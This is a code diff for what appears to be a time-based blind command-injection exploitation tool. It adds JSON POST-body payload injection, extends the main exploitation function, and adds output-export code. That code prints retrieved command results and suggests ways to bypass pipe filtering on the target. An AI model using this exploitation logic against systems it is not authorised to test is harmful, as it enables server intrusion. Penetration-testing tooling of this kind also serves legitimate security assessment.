@@ -17,6 +17,7 @@
 import re
 import sys
 import time
+import json
 import string
 import random
 import base64
@@ -64,9 +65,17 @@ def examine_requests(payload, vuln_parameter, http_request_method, url):
     # Check if its not specified the 'INJECT_HERE' tag
     parameter = parameters.do_POST_check(parameter)
     
-    data = re.sub(settings.INJECT_TAG, payload, parameter)
-    data = data.replace("+","%2B")
-    request = urllib2.Request(url, data)
+    # Define the POST data   
+    if settings.IS_JSON == False:
+      data = re.sub(settings.INJECT_TAG, payload, parameter)
+      data = data.replace("+","%2B")
+      request = urllib2.Request(url, data)
+    else:
+      payload = payload.replace("\"", "\\\"")
+      data = re.sub(settings.INJECT_TAG, urllib.unquote(payload), parameter)
+      data = json.loads(data, strict = False)
+      request = urllib2.Request(url, json.dumps(data))
+
     
   # Check if defined extra headers.
   headers.do_check(request)
@@ -134,9 +143,15 @@ def injection_test(payload, http_request_method, url):
     # Define the vulnerable parameter
     vuln_parameter = parameters.vuln_POST_param(parameter, url)
     
-    # Define the POST data
-    data = re.sub(settings.INJECT_TAG, payload, parameter)
-    request = urllib2.Request(url, data)
+    # Define the POST data   
+    if settings.IS_JSON == False:
+      data = re.sub(settings.INJECT_TAG, payload, parameter)
+      request = urllib2.Request(url, data)
+    else:
+      payload = payload.replace("\"", "\\\"")
+      data = re.sub(settings.INJECT_TAG, urllib.unquote(payload), parameter)
+      data = json.loads(data, strict = False)
+      request = urllib2.Request(url, json.dumps(data))
     
   # Check if defined extra headers.
   headers.do_check(request)
@@ -339,7 +354,7 @@ def referer_injection_test(url, vuln_parameter, payload):
 # -------------------------------------------
 # The main command injection exploitation.
 # -------------------------------------------
-def injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell):
+def injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename):
 
   if menu.options.file_write or menu.options.file_upload:
     minlen = 0
@@ -347,7 +362,8 @@ def injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_m
     minlen = 1
 
   found_chars = False
-  sys.stdout.write("\n(*) Retrieving the length of execution output... ")
+  
+  sys.stdout.write("(*) Retrieving the length of execution output... ")
   sys.stdout.flush()  
 
   for output_length in range(int(minlen), int(maxlen)):
@@ -386,13 +402,14 @@ def injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_m
       how_long = examine_requests(payload, vuln_parameter, http_request_method, url)
     
     if how_long >= delay:
-      if menu.options.verbose:
-        print "\n"
-      else:
-        sys.stdout.write("["+Fore.GREEN+" SUCCEED "+ Style.RESET_ALL+"]\n")
-        sys.stdout.flush()
-      print Style.BRIGHT + "(!) Retrieved " + str(output_length) + " characters."+ Style.RESET_ALL
-      found_chars = True
+      if output_length > 1:
+        if menu.options.verbose:
+          print "\n"
+        else:
+          sys.stdout.write("["+Fore.GREEN+" SUCCEED "+ Style.RESET_ALL+"]\n")
+          sys.stdout.flush()
+        print Style.BRIGHT + "(!) Retrieved " + str(output_length) + " characters."+ Style.RESET_ALL
+        found_chars = True
       break
 
   if found_chars == True : 
@@ -464,8 +481,11 @@ def injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_m
 
   else:
     check_start = 0
-    sys.stdout.write("["+Fore.RED+" FAILED "+ Style.RESET_ALL+"]\n")
-    sys.stdout.flush()  
+    if not menu.options.verbose:
+      sys.stdout.write("["+Fore.RED+" FAILED "+ Style.RESET_ALL+"]\n")
+      sys.stdout.flush()
+    else:
+      print ""
     check_how_long = 0
     output = False
 
@@ -578,5 +598,28 @@ def false_positive_check(separator, TAG, cmd, prefix, suffix, delay, http_reques
 
     if str(output) == str(randvcalc):
       return output
-      
+
+
+# -------------------------------
+# Export the injection results
+# -------------------------------
+def export_injection_results(cmd, separator, output, check_how_long):
+
+  if menu.options.verbose:
+    print ""
+  if output != "" and check_how_long != 0 :
+    print "\n\n" + Fore.GREEN + Style.BRIGHT + output + Style.RESET_ALL
+    sys.stdout.write("\n(*) Finished in "+ time.strftime('%H:%M:%S', time.gmtime(check_how_long)) + ".")
+    if not menu.options.os_cmd:
+      print ""
+  else:
+    # Check if exists pipe filtration.
+    if output != False :
+       print "\n" + Fore.YELLOW  + "(^) Warning: It appears that '" + cmd + "' command could not return any output" + (', due to pipe (|) filtration on target.', '.')[separator == "||"]  + Style.RESET_ALL
+       print Fore.YELLOW  + "             "+ ('To bypass that limitation, u', 'U')[separator == "||"]  +"se '--alter-shell' or try another injection technique (i.e. '--technique=\"f\"')" + Style.RESET_ALL 
+       sys.exit(0)
+    # Check for fault command.
+    else:
+       print Back.RED + "(x) Error: The '" + cmd + "' command, does not return any output." + Style.RESET_ALL + "\n"
+
 #eof
